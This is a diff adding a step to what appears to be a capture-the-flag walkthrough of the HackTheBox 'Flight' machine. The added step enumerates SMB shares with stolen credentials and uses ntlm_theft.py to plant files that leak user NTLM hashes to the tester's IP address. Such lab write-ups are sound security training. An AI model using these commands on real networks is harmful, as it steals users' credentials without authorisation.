@@ -77,5 +77,13 @@
 
 <img width="899" height="317" alt="image" src="https://github.com/user-attachments/assets/10f40940-27d3-4319-b605-f16189875589" />
 
-11. 
+11. User S.Moon has READ and WRITE permissions on Shared SMB share. Upload malicious files to steal user hashes using ntlm_theft.py
+
+`nxc smb flight.htb -u S.Moon -p $(cat ../user/svc_apache.pass) --shares`
+
+`python3 ~/tools/ntlm_theft/ntlm_theft.py -g all -s 10.10.14.226 -f theft`
+
+
+
+12. 
 
